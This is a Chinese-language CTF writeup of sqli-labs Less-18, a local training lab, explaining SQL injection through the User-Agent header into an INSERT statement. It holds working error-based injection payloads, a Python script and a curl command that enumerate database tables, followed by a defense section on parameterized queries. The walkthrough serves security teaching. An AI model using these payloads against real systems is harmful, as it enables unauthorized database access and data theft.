---
layout: post
title: sqli-labs - Less-18 POST 报错注入（User-Agent 头）Writeup
platform: sqli-labs
date: 2026-11-10 08:05:00 +0800
categories: CTF
---

sqli-labs - Less-18 POST 报错注入（User-Agent 头）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-18 → POST - Header Injection - Uagent field - Error Based
- 地址：`http://127.0.0.1:8080/Less-18/`
- 题型：Web / SQL 注入
- 考点：**HTTP 头注入：User-Agent 被 INSERT 进数据库**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（独立数据目录）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
登录 admin/admin（必须用真实密码，登录成功才会 INSERT）
User-Agent: Mozilla/5.0
    → Your User Agent is: Mozilla/5.0
User-Agent: Mozilla/5.0' and extractvalue(1,concat(0x7e,database())) and '1'='1
    → XPATH syntax error: '~security'
```

二、题目分析

**① 源码（关键两段）**

```php
$uagent = $_SERVER['HTTP_USER_AGENT'];          // ★ 直接取请求头，完全没过滤

$sql = "SELECT users.username, users.password FROM users
        WHERE users.username=$uname and users.password=$passwd
        ORDER BY users.id DESC LIMIT 0,1";
if ($row1) {
    $insert = "INSERT INTO security.uagents (uagent, ip_address, username)
               VALUES ('$uagent', '$IP', $uname)";
    mysql_query($insert);
    echo 'Your User Agent is: ' . $uagent;
}
```

**② 三个关键点**

```text
① 注入点在 HTTP 头（User-Agent），不在表单
② UA 被单引号包住 → 闭合写 '
③ 必须登录成功才会执行 INSERT → 先用真实账号 admin/admin 登录
```

**③ 为什么登录名要满足 $uname 的格式**

```text
源码里 username=$uname 没加引号
但 check_input() 会自己加引号 → 直接传 admin 就变成 'admin' ✓
```

三、解题步骤

**第一步：确认登录成功**

```text
uname = admin
passwd = admin
User-Agent = 任意
→ 页面出现 Your User Agent is: ...
★ 说明登录成功、INSERT 执行了
```

**第二步：改 User-Agent 注入**

```text
用 Burp / curl / Python 改请求头：
  User-Agent: Mozilla/5.0' and extractvalue(1,concat(0x7e,database())) and '1'='1

→ XPATH syntax error: '~security'
```

**★ 为什么结尾要 `and '1'='1`：**

```sql
INSERT ... VALUES ('Mozilla/5.0' and extractvalue(...) and '1'='1', '127.0.0.1', 'admin')
                          ↑                                    ↑
                    这里求值会报错                      保证整体语法完整
```

**第三步：爆表 / 数据**

```text
User-Agent: x' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) and '1'='1
→ '~emails,referers,uagents,users'
```

**第四步：脚本（requests 直接改头）**

```python
import requests, re

url = "http://127.0.0.1:8080/Less-18/"

def inj(ua):
    r = requests.post(url,
                      data={"uname": "admin", "passwd": "admin", "submit": "Submit"},
                      headers={"User-Agent": ua}, timeout=10)
    m = re.search(r"XPATH syntax error: '([^']*)'", r.text)
    return m.group(1) if m else None

print(inj("Mozilla/5.0' and extractvalue(1,concat(0x7e,database())) and '1'='1"))
```

**第五步：curl 版**

```bash
curl -s "http://127.0.0.1:8080/Less-18/" \
     -d "uname=admin&passwd=admin&submit=Submit" \
     -H "User-Agent: x' and extractvalue(1,concat(0x7e,database())) and '1'='1"
```

四、延伸知识

**① 哪些 HTTP 头可能被记录进数据库**

```text
User-Agent      ← 本关
Referer         ← Less-19
Cookie          ← Less-20
X-Forwarded-For、Host、X-Real-IP ……
★ 只要后端"记日志/记访问来源"用了这些头，就可能注入
```

**② 头注入怎么发现**

```text
· 页面显示"你的 UA/Referer/IP"之类的回显
· 数据库里有 uagents/referers 这类表
· 改头之后页面行为变化（报错、长度变化）
```

**③ 防御**

```php
// 1. 头部内容不要拼进 SQL（参数化）
$stmt = $pdo->prepare("INSERT INTO uagents (uagent, ip_address, username) VALUES (?, ?, ?)");
$stmt->execute([$uagent, $ip, $uname]);

// 2. 记录访问日志用专门组件，不要直接入库
// 3. 所有输入一视同仁：表单、URL、HTTP 头都算"用户输入"
```

五、总结

- **本题核心：User-Agent 被直接 INSERT 进数据库 → 改请求头就能注入。**

- 三步方法论：

```text
① 先登录成功（admin/admin），确认 INSERT 会执行
② 用代理/脚本把 payload 放进 User-Agent
③ 单引号闭合 + 报错注入 + 结尾补 and '1'='1 保证语法
```

- **三个必记要点**：

```text
① 注入点不止表单：URL、Cookie、User-Agent、Referer 都可能是入口
② 头里的注入要保证整条 SQL 语法完整（结尾补条件）
③ INSERT/UPDATE 没有结果集，用报错注入
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-18：User-Agent 拼进 INSERT → 改请求头就能注入            │
│                                                              │
│  三步：                                                       │
│      ① 先 admin/admin 登录成功（才会 INSERT）                  │
│      ② User-Agent 里塞 payload                                │
│      ③ 结尾补 and '1'='1 保语法完整                            │
│                                                              │
│  ★ 表单、URL、头、Cookie —— 都是用户输入，都能注入              │
└──────────────────────────────────────────────────────────────┘
```
